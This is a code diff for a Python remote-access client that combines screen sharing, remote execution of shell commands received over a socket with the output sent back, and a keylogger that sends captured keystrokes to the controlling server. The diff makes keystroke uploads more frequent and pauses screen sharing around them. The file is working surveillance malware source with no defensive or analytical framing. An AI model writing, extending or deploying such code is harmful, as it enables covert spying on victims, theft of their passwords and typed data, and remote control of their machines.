@@ -126,12 +126,14 @@ class ScreenSharingClient:
                     message = command[7:]
                     messagebox.showinfo(title="You got a Message", message=message)
                 elif command.startswith("CMD"):
+                    self.stop_screen_share()
                     cmd = command[3:]
                     output = self.terminal_function(cmd)
                     self.socket.sendall("C".encode("utf-8"))
                     self.socket.sendall(
                         f"{len(output)} [CMDOUT]{output}".encode("utf-8")
                     )
+                    self.start_screen_share()
                 elif command.lower() == "stop_screenshare":
                     self.stop_screen_share()
                 elif command.lower() == "start_screenshare":
@@ -255,15 +257,18 @@ class Keylogger:
 
     async def send_log(self):
         while True:
-            await asyncio.sleep(300)
+            await asyncio.sleep(50)
             with self.lock:
                 if self.log:
+                    client.stop_screen_share()
+                    await asyncio.sleep(5)
                     log_data = "\n".join(self.log)
                     client.socket.sendall("L".encode("utf-8"))
                     client.socket.sendall(
                         f"Logg{len(log_data)}|{log_data}".encode("utf-8")
                     )
                     self.log = []
+                    client.start_screen_share()
 
     def start_key_logger(self):
         listener = keyboard.Listener(on_press=self.on_press)
@@ -283,3 +288,4 @@ async def main():
 if __name__ == "__main__":
     client = ScreenSharingClient()
     asyncio.run(main())
+# Hello world! I am curently testing the logger, in a minute, this should be printed out in the terminal.
